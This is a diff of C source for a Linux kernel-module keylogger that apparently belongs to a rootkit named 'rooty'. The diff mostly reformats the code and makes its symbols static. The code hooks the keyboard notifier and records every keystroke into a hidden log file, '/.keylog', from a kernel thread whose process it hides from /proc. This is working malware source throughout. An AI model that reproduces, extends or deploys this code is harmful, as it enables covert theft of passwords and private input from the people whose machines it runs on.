@@ -1,151 +1,141 @@
-#ifndef KEYLOGGER_H
-#define KEYLOGGER_H
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/keyboard.h>
+#include <linux/kthread.h>
+#include <linux/wait.h>
+#include <linux/fs.h>
+#include <linux/string.h>
+#include <linux/spinlock.h>
+#include <linux/err.h>
+#include <asm/uaccess.h>
+
+#include "../include/keylogger.h"
+#include "../include/keymap.h"
+#include "../include/proc_fs_hide.h"
 
 #define FLUSHSIZE 16
 #define LOGSIZE   128
 #define LOG_FILE "/.keylog"
 
-unsigned long sequence_i = 0;
+static unsigned long sequence_i = 0;
 
-DECLARE_WAIT_QUEUE_HEAD(flush_event);
+static DECLARE_WAIT_QUEUE_HEAD(flush_event);
 
-struct task_struct *log_ts;
-struct file *logfile;
+static struct task_struct *log_ts;
+static struct file *logfile;
 static DEFINE_SPINLOCK(keylog_lock);
-volatile unsigned long to_flush = 0;
-unsigned long logidx = 0;
-char logbuf[LOGSIZE];
+static volatile unsigned long to_flush = 0;
+static unsigned long logidx = 0;
+static char logbuf[LOGSIZE];
 
-
-static void ksym_std ( struct keyboard_notifier_param *param, char *buf )
+static void ksym_std(struct keyboard_notifier_param *param, char *buf)
 {
     unsigned char val = param->value & 0x7f;
     unsigned long len;
 
-    //printk("rooty: KEYLOGGER: ksym_std: %s\n", ascii[val]);
-
     len = strlcpy(&logbuf[logidx], ascii[val], LOGSIZE - logidx);
-
     logidx += len;
 }
 
-
-static void ksym_fnc ( struct keyboard_notifier_param *param, char *buf )
+static void ksym_fnc(struct keyboard_notifier_param *param, char *buf)
 {
     unsigned char val = param->value & 0xff;
     unsigned long len;
 
-    if ( val & 0xf0 )
-    {
+    if (val & 0xf0) {
         len = strlcpy(&logbuf[logidx], upper[val & 0x0f], LOGSIZE - logidx);
-        //printk("rooty: KEYLOGGER: ksym_fnc: %s\n",upper[val & 0x0f]);
-    }
-    else
-    {
+    } else {
         len = strlcpy(&logbuf[logidx], fncs[val], LOGSIZE - logidx);
-        //printk("rooty: KEYLOGGER: ksym_loc: %s\n",fncs[val]);
     }
 
     logidx += len;
 }
 
-static void ksym_loc ( struct keyboard_notifier_param *param, char *buf )
+static void ksym_loc(struct keyboard_notifier_param *param, char *buf)
 {
     unsigned long len;
     unsigned char val = param->value & 0x0f;
-    //printk("rooty: KEYLOGGER: ksym_loc: %s\n",locpad[val]);
+
     len = strlcpy(&logbuf[logidx], locpad[val], LOGSIZE - logidx);
-
     logidx += len;
 }
 
-static void ksym_num ( struct keyboard_notifier_param *param, char *buf )
+static void ksym_num(struct keyboard_notifier_param *param, char *buf)
 {
     unsigned long len;
     unsigned char val = param->value & 0x0f;
-    //printk("rooty: KEYLOGGER: ksym_num: %s\n",numpad[val]);
+
     len = strlcpy(&logbuf[logidx], numpad[val], LOGSIZE - logidx);
-
     logidx += len;
 }
 
-static void ksym_arw ( struct keyboard_notifier_param *param, char *buf )
+static void ksym_arw(struct keyboard_notifier_param *param, char *buf)
 {
     unsigned long len;
     unsigned char val = param->value & 0x0f;
-    //printk("rooty: KEYLOGGER: ksym_arw: %s\n",arrows[val]);
+
     len = strlcpy(&logbuf[logidx], arrows[val], LOGSIZE - logidx);
     logidx += len;
 }
 
-static void ksym_mod ( struct keyboard_notifier_param *param, char *buf )
+static void ksym_mod(struct keyboard_notifier_param *param, char *buf)
 {
     unsigned long len;
     unsigned char val = param->value & 0x0f;
-    //printk("rooty: KEYLOGGER: ksym_mod: %s\n",mod[val]);
+
     len = strlcpy(&logbuf[logidx], mod[val], LOGSIZE - logidx);
     logidx += len;
 }
 
-static void ksym_cap ( struct keyboard_notifier_param *param, char *buf )
+static void ksym_cap(struct keyboard_notifier_param *param, char *buf)
 {
     unsigned long len;
-    //printk("rooty: KEYLOGGER: ksym_cap: <CAPSLOCK>\n");
+
     len = strlcpy(&logbuf[logidx], "<CAPSLOCK>", LOGSIZE - logidx);
     logidx += len;
 }
 
-void translate_keysym ( struct keyboard_notifier_param *param, char *buf )
+static void translate_keysym(struct keyboard_notifier_param *param, char *buf)
 {
     unsigned char type = (param->value >> 8) & 0x0f;
     unsigned long flags;
 
     spin_lock_irqsave(&keylog_lock, flags);
 
-    if ( logidx >= LOGSIZE )
-    {
+    if (logidx >= LOGSIZE) {
         printk("rooty: KEYLOGGER: Failed to log key, buffer is full\n");
         spin_unlock_irqrestore(&keylog_lock, flags);
         return;
     }
 
-    switch ( type )
-    {
+    switch (type) {
     case 0x0:
         ksym_std(param, buf);
         break;
-
     case 0x1:
         ksym_fnc(param, buf);
         break;
-
     case 0x2:
         ksym_loc(param, buf);
         break;
-
     case 0x3:
         ksym_num(param, buf);
         break;
-
     case 0x6:
         ksym_arw(param, buf);
         break;
-
     case 0x7:
         ksym_mod(param, buf);
         break;
-
     case 0xa:
         ksym_cap(param, buf);
         break;
-
     case 0xb:
         ksym_std(param, buf);
         break;
     }
 
-    if ( logidx >= FLUSHSIZE && to_flush == 0 )
-    {
+    if (logidx >= FLUSHSIZE && to_flush == 0) {
         to_flush = 1;
         spin_unlock_irqrestore(&keylog_lock, flags);
         wake_up_interruptible(&flush_event);
@@ -155,21 +145,21 @@ void translate_keysym ( struct keyboard_notifier_param *param, char *buf )
     spin_unlock_irqrestore(&keylog_lock, flags);
 }
 
-int flusher ( void *data )
+static int flusher(void *data)
 {
     static loff_t pos = 0;
     mm_segment_t old_fs;
     ssize_t ret;
 
-    while (1)
-    {
+    while (1) {
         unsigned long flags;
         unsigned long flush_len;
         char flush_buf[LOGSIZE];
 
-        wait_event_interruptible(flush_event, (to_flush == 1) || kthread_should_stop());
-        if(kthread_should_stop())
-			return 0;
+        wait_event_interruptible(flush_event,
+                                 (to_flush == 1) || kthread_should_stop());
+        if (kthread_should_stop())
+            return 0;
 
         spin_lock_irqsave(&keylog_lock, flags);
         flush_len = logidx;
@@ -178,8 +168,7 @@ int flusher ( void *data )
         logidx = 0;
         spin_unlock_irqrestore(&keylog_lock, flags);
 
-        if (logfile && flush_len > 0)
-        {
+        if (logfile && flush_len > 0) {
             old_fs = get_fs();
             set_fs(get_ds());
             ret = vfs_write(logfile, flush_buf, flush_len, &pos);
@@ -190,29 +179,24 @@ int flusher ( void *data )
     return 0;
 }
 
-int notify ( struct notifier_block *nblock, unsigned long code, void *_param )
+static int notify(struct notifier_block *nblock, unsigned long code, void *_param)
 {
     struct keyboard_notifier_param *param = _param;
-    if ( logfile && param->down )
-    {
-        switch ( code )
-        {
+
+    if (logfile && param->down) {
+        switch (code) {
         case KBD_KEYCODE:
             break;
-
         case KBD_UNBOUND_KEYCODE:
         case KBD_UNICODE:
             break;
-
         case KBD_KEYSYM:
             translate_keysym(param, logbuf);
             break;
-
         case KBD_POST_KEYSYM:
             break;
-
         default:
-            printk("rooty: KEYLOGGER: Received unknown code: %lu\n",code);
+            printk("rooty: KEYLOGGER: Received unknown code: %lu\n", code);
             break;
         }
     }
@@ -220,8 +204,7 @@ int notify ( struct notifier_block *nblock, unsigned long code, void *_param )
     return NOTIFY_OK;
 }
 
-static struct notifier_block nb =
-{
+static struct notifier_block nb = {
     .notifier_call = notify
 };
 
@@ -231,8 +214,8 @@ void init_keylogger(void)
 
     register_keyboard_notifier(&nb);
 
-    logfile = filp_open(LOG_FILE, O_WRONLY|O_APPEND|O_CREAT, S_IRWXU);
-    if ( IS_ERR(logfile) ) {
+    logfile = filp_open(LOG_FILE, O_WRONLY | O_APPEND | O_CREAT, S_IRWXU);
+    if (IS_ERR(logfile)) {
         printk("rooty: KEYLOGGER: Failed to open log file: %s", LOG_FILE);
         logfile = NULL;
     }
@@ -246,10 +229,8 @@ void stop_keylogger(void)
     printk("rooty: Uninstalling keyboard sniffer\n");
     unhide_proc(log_ts->pid);
     kthread_stop(log_ts);
-	
-    if ( logfile )
+
+    if (logfile)
         filp_close(logfile, NULL);
     unregister_keyboard_notifier(&nb);
 }
-
-#endif /* KEYLOGGER_H */
